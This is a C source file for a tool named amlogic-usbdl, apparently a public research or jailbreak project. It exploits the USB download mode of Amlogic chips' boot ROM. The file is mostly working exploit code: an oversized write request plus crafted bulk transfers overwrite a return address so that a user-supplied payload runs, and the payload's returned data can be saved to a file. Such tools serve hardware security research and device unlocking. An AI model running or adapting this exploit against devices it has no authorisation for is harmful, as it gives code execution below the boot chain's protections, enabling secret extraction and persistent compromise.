/* amlogic-usbdl - github.com/frederic/amlogic-usbdl
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
#include "libusb-1.0/libusb.h"

#define DEBUG 1
#define VENDOR_ID 0x1b8e
#define PRODUCT_ID 0xc003

#if DEBUG
#define dprint(args...) printf(args)
#else
#define dprint(args...)
#endif

#define AM_REQ_WR_LARGE_MEM 0x11

#define LOAD_ADDR 0xfffa0000
#define RUN_ADDR  LOAD_ADDR
#define TARGET_RA_PTR 0xfffe3688
#define BULK_TRANSFER_SIZE 0x100					  //alternative : 0x200, 0x1000
#define MAX_PAYLOAD_SIZE 0x10000 - BULK_TRANSFER_SIZE // we need the last transfer to overwrite return address
#define BULK_TRANSFER_COUNT ((TARGET_RA_PTR - LOAD_ADDR) / BULK_TRANSFER_SIZE)
#define RAM_SIZE ((TARGET_RA_PTR - (LOAD_ADDR + (BULK_TRANSFER_COUNT * BULK_TRANSFER_SIZE))) / 4) + 1

libusb_device_handle *handle = NULL;

typedef struct __attribute__((__packed__)) dldata_s
{
	u_int32_t addr;
	u_int32_t size;
	u_int32_t unk0;
	u_int32_t unk1;
	u_int8_t data[];
} dldata_t;

static int save_received_data(const char *filename){
	FILE *fd;
	int transferred = 0;
	int total_transferred = 0;
	uint8_t buf[0x200];//todo

	fd = fopen(filename,"wb");
	if (fd == NULL) {
		fprintf(stderr, "Error: Can't open output file!\n");
		return -1;
	}

	do {
		libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_IN | 1, buf, sizeof(buf), &transferred, 10);// no error handling because device-side is a mess anyway
		fwrite(buf, 1, transferred, fd);
		total_transferred += transferred;
	} while(transferred);

	fclose(fd);

	return total_transferred;
}

static int exploit(dldata_t *payload)
{
	int rc, transferred, i = 0;
	uint8_t bmRequestType, bRequest = 0;
	uint16_t wValue, wIndex, wLength = 0;
	u_int32_t ram[RAM_SIZE] = {0};
	bmRequestType = 0x40;
	bRequest = AM_REQ_WR_LARGE_MEM;
	wValue = BULK_TRANSFER_SIZE;
	wIndex = BULK_TRANSFER_COUNT + 1; //one extra transfer to overwrite return address
	wLength = sizeof(dldata_t);

	payload->size += BULK_TRANSFER_SIZE; //extra transfer to overwrite return address...

	printf("- exploit: starting.\n");
	rc = libusb_control_transfer(handle, bmRequestType, bRequest, wValue, wIndex, (uint8_t *)payload, wLength, 0);
	if (rc != wLength)
	{
		printf("libusb_control_transfer : error %d\n", rc);
		fprintf(stderr, "Error libusb_control_transfer: %s\n", libusb_error_name(rc));
		return rc;
	}

	payload->size -= BULK_TRANSFER_SIZE; //but we'll do it later

	printf("- exploit: sending payload...\n");
	uint8_t *payload_ptr = (uint8_t *)&payload->data;
	do
	{
		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, payload_ptr, (payload->size < wValue ? payload->size : wValue), &transferred, 0);
		if (rc)
		{
			printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
			return rc;
		}
		payload_ptr += transferred;
		assert(payload->size >= transferred);
		payload->size -= transferred;
		wIndex--;
		dprint("libusb_bulk_transfer: transferred=%u, transfers left=%u\n", transferred, wIndex);
	} while (payload->size > 0 && wIndex);

	printf("- exploit: sending %u dummy transfers...\n", wIndex - 1);
	for (i = 0; i < wIndex - 1; i++)
	{
		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)&payload->data, 0, &transferred, 0);
		if (rc)
		{
			printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
			return rc;
		}
		dprint("libusb_bulk_transfer[%u]: transferred=%d\n", i, transferred);
	}

	//overwrite return address with payload address
	ram[RAM_SIZE - 1] = RUN_ADDR;

	printf("- exploit: sending last transfer to overwrite RAM...\n");
	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)ram, sizeof(ram), &transferred, 0);
	if (rc)
	{
		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
		return rc;
	}
	dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
	printf("- exploit: done.\n");

	return rc;
}

int main(int argc, char *argv[])
{
	libusb_context *ctx;
	FILE *fd;
	dldata_t *payload;
	uint8_t identity[6];
	size_t payload_size, fd_size;
	int rc;

	if (!(argc == 2 || argc == 3))
	{
		printf("Usage: %s <input_file> [<output_file>]\n", argv[0]);
		printf("\tinput_file: payload binary to load and execute (max size %u bytes)\n", MAX_PAYLOAD_SIZE);
		printf("\toutput_file: file to write data returned by payload\n");
		return EXIT_SUCCESS;
	}

	fd = fopen(argv[1], "rb");
	if (fd == NULL)
	{
		fprintf(stderr, "Can't open input file %s !\n", argv[1]);
		return EXIT_FAILURE;
	}

	fseek(fd, 0, SEEK_END);
	fd_size = ftell(fd);

	if (fd_size > MAX_PAYLOAD_SIZE)
	{
		fprintf(stderr, "Error: input payload size cannot exceed %u bytes !\n", MAX_PAYLOAD_SIZE);
		return EXIT_FAILURE;
	}

	payload = (dldata_t *)calloc(1, sizeof(dldata_t) + MAX_PAYLOAD_SIZE);
	payload->addr = LOAD_ADDR;
	payload->size = MAX_PAYLOAD_SIZE;

	fseek(fd, 0, SEEK_SET);
	payload_size = fread(&payload->data, 1, fd_size, fd);
	if (payload_size != fd_size)
	{
		fprintf(stderr, "Error: cannot read entire file !\n");
		return EXIT_FAILURE;
	}

	rc = libusb_init(&ctx);
	if (rc < 0)
	{
		fprintf(stderr, "Error: failed to initialise libusb: %s\n", libusb_error_name(rc));
		return EXIT_FAILURE;
	}

	handle = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, PRODUCT_ID);
	if (!handle)
	{
		fprintf(stderr, "Error: cannot open device %04x:%04x\n", VENDOR_ID, PRODUCT_ID);
		libusb_exit(NULL);
		return EXIT_FAILURE;
	}

	rc = libusb_claim_interface(handle, 0);
	if (rc)
	{
		fprintf(stderr, "Error claiming interface: %s\n", libusb_error_name(rc));
		return EXIT_FAILURE;
	}

	rc = libusb_control_transfer(handle, 0xc0, 0x20, 0, 0, identity, sizeof(identity), 0);
	if (rc != sizeof(identity))
	{
		fprintf(stderr, "Error: cannot execute identify command!\n");
		return EXIT_FAILURE;
	}

	if(identity[4])
	{
		fprintf(stderr, "Error: device is protected by password.\n");
		return EXIT_FAILURE;
	}
	else
	{
		exploit(payload);
	}

	if(argc == 3){
		rc = save_received_data(argv[2]);
		if(rc > 0){
			printf("Received data saved to file %s (%u bytes).\n", argv[2], rc);
		}
	}

	libusb_release_interface(handle, 0);

	if (handle)
	{
		libusb_close(handle);
	}

	//libusb_exit(NULL);//double free on qubes os...

	return EXIT_SUCCESS;
}
